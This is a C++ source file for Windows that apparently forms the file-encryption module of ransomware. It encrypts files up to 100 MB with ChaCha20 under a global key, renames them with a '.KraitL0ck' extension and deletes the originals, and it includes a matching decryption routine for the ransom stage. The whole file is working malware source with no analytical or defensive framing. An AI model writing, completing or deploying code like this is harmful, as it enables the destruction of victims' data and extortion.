#include "encryption.h"
#undef EncryptFile
#undef DecryptFile
#include <sodium.h>
#include <windows.h>
#include <fstream>
#include <vector>
#include <cstring>

static std::vector<uint8_t> g_key;

void Encryption::Initialize(const std::vector<uint8_t>& key) {
    g_key = key;
    (void)sodium_init();
}

void Encryption::EncryptFile(const std::string& filePath) {
    std::ifstream in(filePath, std::ios::binary);
    if (!in) return;

    in.seekg(0, std::ios::end);
    size_t size = in.tellg();
    if (size > 100 * 1024 * 1024 || size == 0) {
        in.close();
        return;
    }

    in.seekg(0, std::ios::beg);
    std::vector<uint8_t> data(size);
    in.read((char*)data.data(), size);
    in.close();

    uint8_t nonce[crypto_stream_chacha20_NONCEBYTES];
    randombytes_buf(nonce, sizeof(nonce));

    std::vector<uint8_t> encrypted(size);
    crypto_stream_chacha20_xor(encrypted.data(), data.data(), size, nonce, g_key.data());

    std::string newPath = filePath + ".KraitL0ck";
    std::ofstream out(newPath, std::ios::binary);
    out.write((char*)nonce, sizeof(nonce));
    out.write((char*)encrypted.data(), encrypted.size());
    out.close();

    DeleteFileA(filePath.c_str());
}

void Encryption::DecryptFile(const std::string& filePath) {
    std::ifstream in(filePath, std::ios::binary);
    if (!in) return;

    uint8_t nonce[crypto_stream_chacha20_NONCEBYTES];
    in.read((char*)nonce, sizeof(nonce));
    if (in.gcount() != sizeof(nonce)) {
        in.close();
        return;
    }

    std::vector<uint8_t> encrypted((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();

    if (encrypted.empty()) return;

    std::vector<uint8_t> decrypted(encrypted.size());
    crypto_stream_chacha20_xor(decrypted.data(), encrypted.data(), encrypted.size(), nonce, g_key.data());

    std::string originalPath = filePath;
    size_t pos = originalPath.find_last_of('.');
    if (pos != std::string::npos) {
        originalPath = originalPath.substr(0, pos);
    }

    std::ofstream out(originalPath, std::ios::binary);
    out.write((char*)decrypted.data(), decrypted.size());
    out.close();

    DeleteFileA(filePath.c_str());
}

std::vector<uint8_t> Encryption::EncryptData(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> result(data.size());
    uint8_t nonce[crypto_stream_chacha20_NONCEBYTES] = {0};
    crypto_stream_chacha20_xor(result.data(), data.data(), data.size(), nonce, g_key.data());
    return result;
}

std::vector<uint8_t> Encryption::DecryptData(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> result(data.size());
    uint8_t nonce[crypto_stream_chacha20_NONCEBYTES] = {0};
    crypto_stream_chacha20_xor(result.data(), data.data(), data.size(), nonce, g_key.data());
    return result;
}
